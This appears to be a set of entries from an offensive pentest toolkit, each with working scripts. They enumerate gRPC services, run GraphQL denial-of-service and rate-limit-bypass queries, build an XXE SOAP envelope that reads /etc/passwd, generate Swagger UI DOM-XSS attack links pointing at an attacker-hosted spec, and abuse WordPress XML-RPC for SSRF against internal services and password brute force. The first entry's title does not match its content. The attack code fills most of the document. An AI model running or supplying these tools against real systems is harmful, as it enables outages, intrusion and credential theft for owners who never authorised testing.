entries.title: OpenAPI / Swagger mass tester (path x method)
gRPC reflection enumeration (grpcurl wrapper)
entries.body:
Enumeration of a **gRPC service via server reflection** with the `grpcurl` utility: list services, describe methods and messages, make a trial call. If reflection is enabled, you get a full map of the API without `.proto` files.

> `-plaintext` = a connection **without TLS** (not "HTTP/1.1"), for cleartext gRPC. `-insecure` = TLS, but skips certificate verification. Pick the flag to match the target. grpcurl is bundled-friendly (MIT).

deps: `grpcurl` (apt/brew install grpcurl). placeholders: `{{TARGET}}` (host:port, e.g. 10.0.0.5:50051).

```bash
#!/usr/bin/env bash
# grpc_reflect_enum.sh - ARS3NAL (GPL-3.0). Wraps grpcurl (MIT). AUTHORIZED testing only.
set -u
T="${1:?usage: grpc_reflect_enum.sh <host:port> [-plaintext|-insecure]}"
MODE="${2:--plaintext}"   # -plaintext (no TLS) | -insecure (TLS, skip cert)

echo "[*] target=$T mode=$MODE"
command -v grpcurl >/dev/null || { echo "[!] install grpcurl first"; exit 1; }

echo "=== services ==="
SVCS=$(grpcurl $MODE "$T" list 2>&1)
echo "$SVCS"
echo "$SVCS" | grep -qiE 'reflection|cannot|unimplemented' && \
  echo "[i] if reflection is off -> you need a .proto: grpcurl -proto x.proto ..."

echo
echo "=== methods + messages per service ==="
echo "$SVCS" | grep -vi reflection | while read -r svc; do
  [ -z "$svc" ] && continue
  echo "--- $svc ---"
  grpcurl $MODE "$T" describe "$svc" 2>/dev/null
done

echo
echo "=== sample empty call (auth / shape probe) ==="
FIRST=$(echo "$SVCS" | grep -vi reflection | head -1)
if [ -n "$FIRST" ]; then
  M=$(grpcurl $MODE "$T" list "$FIRST" 2>/dev/null | head -1)
  [ -n "$M" ] && grpcurl $MODE -d '{}' "$T" "$M" 2>&1 | head -10
fi

echo "[=] reflection on = a map of the API; auth errors on the call = a bypass point"
```

Run:
```bash
bash grpc_reflect_enum.sh 10.0.0.5:50051 -plaintext
bash grpc_reflect_enum.sh api.target.com:443 -insecure
```

entries.title: GraphQL DoS / rate-limit-bypass probe (5 vectors)
entries.body:
A probe for **GraphQL DoS and rate-limit bypass** with five vectors: an introspection dump of the schema, **alias amplification** (N copies of a heavy field in one query), **deep nesting** (a cyclic traversal of relations), **JSON batching** (an array of queries in one HTTP request - bypasses per-request RL) and **field duplication** (repeating one field hundreds of times - **CVE-2024-39895 in Directus** took the server down exactly this way).

> destructive: amplification and nesting genuinely load the server. Start with small `--mult`/`--depth` and watch the response time. Introspection is often open even when "disabled" in prod.

deps: `pip install requests`. placeholders: `{{URL}}` (graphql endpoint), `{{FIELD}}` (a heavy field from the schema).

```python
#!/usr/bin/env python3
# graphql_dos_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, time, requests

INTROSPECT = "{__schema{queryType{name} types{name fields{name}}}}"

def post(url, query, hdr, timeout, batch=None):
    body = batch if batch is not None else {"query": query}
    t0 = time.time()
    r = requests.post(url, json=body, headers=hdr, timeout=timeout, verify=False)
    return r, time.time() - t0

def alias_amplification(field, mult):
    parts = " ".join(f"a{i}: {field}" for i in range(mult))
    return "{" + parts + "}"

def field_duplication(field, mult):
    # CVE-2024-39895 class: the same leaf repeated N times
    parts = " ".join([field] * mult)
    return "{" + parts + "}"

def deep_nesting(field, depth):
    inner = field
    for _ in range(depth):
        inner = f"{field}{{ {inner} }}"
    return "{" + inner + "}"

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL GraphQL DoS / RL-bypass probe")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-f", "--field", default="__typename", help="heavy field from schema")
    ap.add_argument("--mult", type=int, default=50, help="alias/dup count")
    ap.add_argument("--depth", type=int, default=6)
    ap.add_argument("--batch", type=int, default=20, help="JSON-batch size")
    ap.add_argument("--header", action="append", default=[], help="Extra header k:v")
    ap.add_argument("--timeout", type=int, default=30)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()
    hdr = {"Content-Type": "application/json"}
    for h in a.header:
        k, _, v = h.partition(":"); hdr[k.strip()] = v.strip()

    print("=== [1] introspection ===")
    r, dt = post(a.url, INTROSPECT, hdr, a.timeout)
    on = "__schema" in r.text
    print(f"  status={r.status_code} time={dt:.2f}s introspection={'ON' if on else 'off'}")

    print("=== [2] alias amplification ===")
    r, dt = post(a.url, alias_amplification(a.field, a.mult), hdr, a.timeout)
    print(f"  x{a.mult} status={r.status_code} time={dt:.2f}s")

    print("=== [3] field duplication (CVE-2024-39895 class) ===")
    r, dt = post(a.url, field_duplication(a.field, a.mult), hdr, a.timeout)
    print(f"  x{a.mult} status={r.status_code} time={dt:.2f}s")

    print("=== [4] deep nesting ===")
    r, dt = post(a.url, deep_nesting(a.field, a.depth), hdr, a.timeout)
    print(f"  depth={a.depth} status={r.status_code} time={dt:.2f}s")

    print("=== [5] JSON batching (per-request RL bypass) ===")
    batch = [{"query": "{__typename}"} for _ in range(a.batch)]
    r, dt = post(a.url, None, hdr, a.timeout, batch=batch)
    accepted = r.text.count("__typename") if r.ok else 0
    print(f"  batch={a.batch} status={r.status_code} time={dt:.2f}s accepted~{accepted}")
    print("\n[=] time growing with mult/depth = no cost-limit; batch>1 ok = RL is bypassed")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 graphql_dos_probe.py -u https://target/graphql -f users --mult 50 --depth 6 --batch 20
```

entries.title: SOAP / WSDL probe (operations + XXE skeleton)
entries.body:
A **SOAP/WSDL** probe: it fetches `?wsdl`, enumerates the operations and prints a SOAP envelope skeleton - a ready-made injection point (XXE via XML, command in parameters). Old SOAP services are often unauthenticated and parse external entities.

deps: `curl`, optional `xmllint`. placeholders: `{{URL}}` (the service endpoint).

```bash
#!/usr/bin/env bash
# soap_wsdl_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
set -u
U="${1:?usage: soap_wsdl_probe.sh <service-url>}"
C="curl -s -k --max-time 12"

echo "[*] fetching WSDL"
WSDL=$($C "$U?wsdl"); [ -z "$WSDL" ] && WSDL=$($C "$U?WSDL")
[ -z "$WSDL" ] && { echo "[!] no WSDL at $U?wsdl"; exit 1; }
echo "$WSDL" | head -c 200; echo " ..."

echo
echo "=== operations ==="
echo "$WSDL" | grep -oE '<(wsdl:)?operation name="[^"]+"' | \
  sed -E 's/.*name="([^"]+)".*/  \1/' | sort -u

echo
echo "=== target namespace ==="
echo "$WSDL" | grep -oE 'targetNamespace="[^"]+"' | head -1

echo
echo "=== SOAP envelope skeleton (XXE injection point) ==="
cat <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <OPERATION_NAME>
        <param>&xxe;</param>
      </OPERATION_NAME>
    </soap:Body>
  </soap:Envelope>
EOF
echo "[=] substitute the operation and POST to the endpoint with Content-Type: text/xml"
```

Run:
```bash
bash soap_wsdl_probe.sh https://target/services/Calc
```

entries.title: Swagger UI configUrl/url DOM-XSS probe
entries.body:
Probe for **Swagger UI ?url= / ?configUrl=**: fingerprints the swagger-ui version, classifies the vuln window (DOM-XSS 3.14.1-3.37.x / spoofing <4.1.3 / >=4.1.3 off) and assembles ready attack links (?url=, ?configUrl=, data: URI) for your spec.

> A server-side GET of the swagger-ui page will not execute JS - do the OOB test in a REAL browser (--spec at http://collab/evil.yaml). The DOM-XSS payload is the mXSS gadget in the spec's description field (see the Payloads card).

deps: `pip install requests`. placeholders: `{{URL}}` (Swagger UI), `{{SPEC}}` (attacker spec).

```python
#!/usr/bin/env python3
# swagger_configurl_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, base64, json, re, sys, requests

def fingerprint(html, base, s):
    m = re.search(r'swagger-ui[^"\']*?(\d+\.\d+\.\d+)', html)
    if m:
        return m.group(1)
    for js in re.findall(r'src=["\']([^"\']+\.js)["\']', html)[:6]:
        u = js if js.startswith('http') else base.rsplit('/', 1)[0] + '/' + js.lstrip('/')
        try:
            t = s.get(u, timeout=10, verify=False).text
        except requests.RequestException:
            continue
        mm = re.search(r'"version"\s*:\s*"(\d+\.\d+\.\d+)"', t) or re.search(r'@version\s*v?(\d+\.\d+\.\d+)', t)
        if mm:
            return mm.group(1)
    return None

def classify(ver):
    if not ver:
        return "unknown (fingerprint failed)"
    p = tuple(int(x) for x in ver.split('.')[:3])
    if (3, 14, 1) <= p < (3, 38, 0):
        return "DOM-XSS window (3.14.1-3.37.x, CVE-2025-8191)"
    if p < (4, 1, 3):
        return "spoofing window (<4.1.3, CVE-2018-25031); DOM-XSS needs a 3.14.1-3.37.x engine"
    return ">=4.1.3: URL config off by default (needs queryConfigEnabled=true)"

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL Swagger UI configUrl/url probe")
    ap.add_argument("-u", "--url", required=True, help="Swagger UI URL, e.g. https://t/swagger-ui/")
    ap.add_argument("-s", "--spec", default="https://EVIL/evil.yaml", help="attacker spec URL")
    ap.add_argument("--timeout", type=int, default=15)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()
    s = requests.Session(); s.headers["User-Agent"] = "Mozilla/5.0"
    try:
        html = s.get(a.url, timeout=a.timeout, verify=False).text
    except requests.RequestException as e:
        sys.exit(f"[!] fetch failed: {e}")
    ver = fingerprint(html, a.url, s)
    print(f"[*] Swagger UI: {a.url}")
    print(f"[=] version: {ver or '?'}  -> {classify(ver)}\n")
    cfg = base64.b64encode(json.dumps({"url": a.spec}).encode()).decode()
    b = a.url.rstrip('/')
    print("[+] attack URLs (deliver to a victim on a URL-config-enabled instance):")
    print(f"    {b}/?url={a.spec}")
    print(f"    {b}/?configUrl={a.spec.rsplit('/', 1)[0]}/evil-config.json")
    print(f"    {b}/?configUrl=data:text/html;base64,{cfg}")
    print("\n[i] OOB test: point --spec at http://<collab>/evil.yaml and watch for the fetch in a REAL browser.")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 swagger_configurl_probe.py -u https://target/swagger-ui/
python3 swagger_configurl_probe.py -u https://target/swagger-ui/ -s http://abcd.oast.pro/evil.yaml
```

entries.title: WordPress XML-RPC abuse (listMethods / pingback SSRF / brute)
entries.body:
Abuse of **WordPress XML-RPC** (`/xmlrpc.php`): `system.listMethods` (enum), `pingback.ping` SSRF/XSPA (the server fetches a URL you supply) and `wp.getUsersBlogs` brute force. Pingback is on by default even in 2025 (see CVE-2025-54352, won't-fix).

> Amplification via `system.multicall` is dead since WP 4.4 (the batch aborts on the first auth failure) -> brute runs 1 guess/request, but still bypasses wp-login-only lockout plugins. Pingback fault codes: 17 = fetched (port OPEN), 16 = source unreachable (CLOSED), 33 = fix --post (needs a real published post).

deps: `pip install requests`. placeholders: `{{URL}}` (…/xmlrpc.php), opt. `{{SSRF}}`, `{{POST}}`.

```python
#!/usr/bin/env python3
# wp_xmlrpc_abuse.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, sys, requests

def post(url, body, timeout):
    return requests.post(url, data=body.encode(), headers={"Content-Type": "application/xml"},
                         timeout=timeout, verify=False)

LISTM = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'

def pingback(src, tgt):
    return ('<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params>'
            f'<param><value><string>{src}</string></value></param>'
            f'<param><value><string>{tgt}</string></value></param></params></methodCall>')

def guess(user, pw):
    return ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params>'
            f'<param><value><string>{user}</string></value></param>'
            f'<param><value><string>{pw}</string></value></param></params></methodCall>')

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL WordPress XML-RPC abuse")
    ap.add_argument("-u", "--url", required=True, help="https://target/xmlrpc.php")
    ap.add_argument("--ssrf", help="internal URL for pingback source (e.g. http://127.0.0.1:6379/)")
    ap.add_argument("--post", help="a REAL published post URL on the target (pingback target)")
    ap.add_argument("--user")
    ap.add_argument("--passwords", help="wordlist for wp.getUsersBlogs brute")
    ap.add_argument("--timeout", type=int, default=15)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()

    print("[*] system.listMethods")
    try:
        r = post(a.url, LISTM, a.timeout)
    except requests.RequestException as e:
        sys.exit(f"[!] {e}")
    print(f"    status={r.status_code}; pingback={'yes' if 'pingback.ping' in r.text else 'no'}; "
          f"multicall={'yes' if 'system.multicall' in r.text else 'no'}")

    if a.ssrf and a.post:
        print(f"[*] pingback SSRF: source={a.ssrf} target={a.post}")
        r = post(a.url, pingback(a.ssrf, a.post), a.timeout)
        print(f"    {r.text.strip()[:200]}")
        print("    [i] fault 17=fetched (port OPEN) ; 16=source unreachable (CLOSED) ; 33=fix --post")

    if a.user and a.passwords:
        print(f"[*] brute wp.getUsersBlogs user={a.user} (WP4.4+ multicall-amp dead -> 1 guess/req)")
        for line in open(a.passwords, encoding="utf-8", errors="ignore"):
            pw = line.strip()
            if not pw:
                continue
            r = post(a.url, guess(a.user, pw), a.timeout)
            if 'isAdmin' in r.text or ('<struct>' in r.text and 'faultCode' not in r.text):
                print(f"    [+] VALID: {a.user}:{pw}"); return
            print(f"    [-] {pw}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 wp_xmlrpc_abuse.py -u https://target/xmlrpc.php
python3 wp_xmlrpc_abuse.py -u https://target/xmlrpc.php --ssrf http://127.0.0.1:6379/ --post https://target/?p=1
python3 wp_xmlrpc_abuse.py -u https://target/xmlrpc.php --user admin --passwords rockyou.txt
```
